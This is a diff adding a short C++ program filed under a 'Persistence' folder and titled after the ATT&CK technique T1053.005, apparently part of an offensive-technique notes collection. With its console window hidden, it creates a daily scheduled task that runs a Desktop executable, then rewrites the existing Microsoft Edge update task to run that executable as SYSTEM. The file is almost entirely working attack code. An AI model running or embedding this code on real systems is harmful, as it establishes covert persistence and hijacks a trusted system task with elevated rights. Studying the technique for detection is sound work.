@@ -1,0 +1,52 @@
+---
+title: "T1053.005.ScheduledTask"
+folder: "05. Persistence"
+---
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+void NewTask() {
+
+    const char* command = "cmd.exe /C echo Y | schtasks /create /tn \"Test\" /tr \"C:\\Users\\User\\Desktop\\KimJestem.exe\" /sc daily /st 19:00";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+
+void Changetask() {
+
+    const char* command = "schtasks /change /tn \"MicrosoftEdgeUpdateTaskMachineUA\" /tr \"C:\\Users\\User\\Desktop\\KimJestem.exe\" /ru SYSTEM";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    NewTask();
+    Changetask();
+
+    return 0;
+}
